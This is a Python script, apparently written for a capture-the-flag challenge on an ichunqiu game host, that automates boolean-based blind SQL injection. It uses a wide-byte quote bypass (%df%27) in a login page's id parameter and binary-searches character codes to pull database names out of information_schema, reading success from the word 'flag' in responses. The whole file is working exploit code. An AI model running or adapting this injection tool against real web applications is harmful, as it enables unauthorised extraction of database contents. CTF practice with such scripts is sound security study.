import requests

#fields 字段
#index 第{index}个字符
#table_name 表
def get_hacksql_content(fields,table_name,index):
    sqli_str = " (select ascii(substring(group_concat({fields}) from {index} for 1)) from {table_name})"
    return sqli_str.format(fields=fields,table_name=table_name,index=index)

#fields 字段
#table_name 表
def get_hacksql_length(fields,table_name):
    sqli_str = " (select length(group_concat({fields})) from  {table_name})"
    return sqli_str.format(fields=fields,table_name=table_name)
    
#二分搜索
#start:搜索起点
#end:搜索终点
#filter:接受两个参数，第一个是">,<,="，第二个是当前搜索的中点，返回搜索值与中点的大小关系
def binary_search(start,end,filter):

    start_now = start
    end_now = end
    get_middle = lambda s,e:(s+(e-s)//2)

    if end==start or start>end:
        print("input right that end one must < start one")
        exit(0)

    while True:
        middle = get_middle(start_now,end_now)
        
        if filter(">",middle):
            start_now = middle

        elif filter("<",middle):
            end_now = middle

        elif filter("=",middle):
            return middle

        if (end_now-start_now)==2:
            for i in range(start_now,end_now+1):
                if filter("=",i):
                    return i
            return -1 


def filter_length(symble,value):
    url = "http://3b2f27672e7c41d3ad9b21a1378ea3fbb0ece11192da4500.game.ichunqiu.com/l0gin.php?id=%df%27{}%23"
    sql_content = get_hacksql_length("schema_name","information_schema.SCHEMATA")
    sqli_str = "or (select ({content} {symble}{value}))".format(content=sql_content,symble=symble,value=value)
    r = requests.get(url.format(sqli_str))
    if "flag" in r.text:
        return True
    else:
        return False


def filter_content(symble,value,index):
    url = "http://3b2f27672e7c41d3ad9b21a1378ea3fbb0ece11192da4500.game.ichunqiu.com/l0gin.php?id=%df%27{}%23"
    sql_content = get_hacksql_content("schema_name","information_schema.SCHEMATA",index)
    sqli_str = "or (select ({content} {symble}{value}))".format(content=sql_content,symble=symble,value=value)
    r = requests.get(url.format(sqli_str))
    if "flag" in r.text:
        return True
    else:
        return False

#ascii A-Z:65-90
#a-z:97-122
#0-9:48-57
#_(下划线):95
#,(逗号):44

def get_db_name():
    result = ""
    search =[{"s":65,"e":90},{"s":97,"e":122},{"s":48,"e":57}]
    index=0
    length = binary_search(1,200,filter_length)
    print(length)
    print(f"result length : {length}")
    while length is not 0:

        index += 1

        if index>length:
            break
        if filter_content("=",95,index):
            result = result + chr(95)
        elif filter_content("=",44,index):
            result = result + chr(44)
  
        else:
            for item in search:
                ascii_num = binary_search(item["s"],item["e"],lambda i,j:filter_content(i,j,index))
                if ascii_num!=-1:
                    result += chr(ascii_num)
                     
        print(result)




 